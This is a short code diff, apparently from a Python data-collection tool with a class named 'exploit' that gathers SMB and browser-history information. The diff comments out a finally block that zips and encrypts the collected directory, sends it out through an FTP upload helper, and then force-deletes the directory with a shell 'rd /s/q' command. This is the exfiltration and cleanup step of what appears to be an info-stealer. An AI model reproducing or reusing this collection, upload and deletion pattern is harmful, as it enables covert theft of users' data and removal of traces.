@@ -70,9 +70,9 @@ class exploit:
                 smb_version(network, dump)
         except Exception:
             pass
-        finally:
-            upload_.ftp_upload(upload_.zip_encrypt(constant.upload_dir))
-            os.system("rd /s/q" + " " + constant.upload_dir)
+        # finally:
+        #     upload_.ftp_upload(upload_.zip_encrypt(constant.upload_dir))
+        #     os.system("rd /s/q" + " " + constant.upload_dir)
 
     def browers_history(self):
         Software_ = Software()
